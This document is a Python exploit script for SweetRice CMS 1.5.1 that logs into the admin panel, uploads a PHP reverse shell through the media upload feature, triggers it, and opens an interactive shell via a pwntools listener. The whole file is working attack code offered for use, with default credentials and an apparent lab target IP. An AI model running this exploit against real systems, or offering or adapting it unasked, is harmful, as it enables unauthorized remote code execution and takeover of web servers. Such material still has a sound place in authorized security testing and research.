#!/usr/bin/python3
#Coding: utf-8
# Exploit Title: SweetRice 1.5.1 - Unrestricted File Upload
# Exploit Author: k4miyo
# Vendor: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1

import requests, sys, json, signal, argparse, time, threading
from pwn import *

# Global variables
username = "manager"
password = "Password123"
url = "http://10.10.170.246/content"
reverseFile = "php-reverse-shell.php5"

# Ctrl + C
def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def makeRequest():
    p1 = log.progress("Login CMS SweetRice")
    p1.status("Login into Panel CMS SweetRice")
    time.sleep(2)
    s = requests.session()
    url_login = url + "/as/?type=signin"
    data_login = {'user':username,
            'passwd':password,
            'rememberMe':''
            }
    p1.status("Login into {}".format(url_login))
    time.sleep(2)
    r = s.post(url_login, data=data_login)
    result = json.loads(r.text)
    if result["statusInfo"] != "Login success":
        p1.failure("Incorrect username or password or URL")
        time.sleep(2)
        sys.exit(1)
    p1.success("Login successful")
    time.sleep(2)

    url_upload = url + "/as/?type=media_center&mode=upload"
    
    p2 = log.progress("Reading file")
    try:
        p2.status("Opening file {}".format(reverseFile))
        time.sleep(2)
        files = {'upload[]': open(reverseFile,'rb')}
    except Exception as e:
        p2.failure("File {} does not exist!".format(reverseFile))
        time.sleep(2)
        sys.exit(1)
    p2.success("File {} exists!".format(reverseFile))
    time.sleep(2)
    
    p3 = log.progress("File")
    p3.status("Uploading file")
    time.sleep(2)
    r = s.post(url_upload, files=files)
    result = r.status_code
    if result != 200:
        p3.failure("Error uploading file")
        time.sleep(2)
        sys.exit(1)
    p3.success("File uploaded")
    time.sleep(2)

    p4 = log.progress("Reverse Shell")
    p4.status("Executing reverse shell")
    time.sleep(2)
    url_reverse = url + "/attachment/{}".format(reverseFile)
    try:
        r = s.post(url_reverse, timeout=20)
    except requests.exceptions.Timeout:
        pass
    p4.success("Correct reverse shell")


if __name__=='__main__':
    argparser = argparse.ArgumentParser(description='Authenticated Remote Code Execution - SweetRice 1.5.1')
    argparser.add_argument('--url', type=str,
            help='URL SweetRice',
            required=True)
    argparser.add_argument('--user', type=str,
            help='Username Panel Login SweetRice',           
            required=True)
    argparser.add_argument('--passwd', type=str,
            help='Password Panel Login SweetRice',           
            required=True)
    argparser.add_argument('--filename', type=str,
            help='Reverse Shell Filename (default: php-reverse-shell.php5)',           
            default='php-reverse-shell.php5')
    argparser.add_argument('--lhost', type=str,
            help='Local host (attacker IP address)',
            required=True)
    argparser.add_argument('--lport', type=str,
            help='Local port (attacker port)',
            default='443')
    args = argparser.parse_args()

    url = args.url
    username = args.user
    password = args.passwd
    reverseFile = args.filename
    lhost = args.lhost
    lport = args.lport

    try:
        threading.Thread(target=makeRequest).start()
    except Exception as e:
        log.error(str(e))
        sys.exit(1)

    p5 = log.progress("Shell")
    p5.status("Listening...")
    time.sleep(2)
    shell = listen(lport, timeout=20).wait_for_connection()
    if shell.sock is None:
        p5.failure("No connection")
        time.sleep(2)
        sys.exit(1)
    else:
        p5.success("Established connection!")
        time.sleep(2)
    
    shell.interactive()
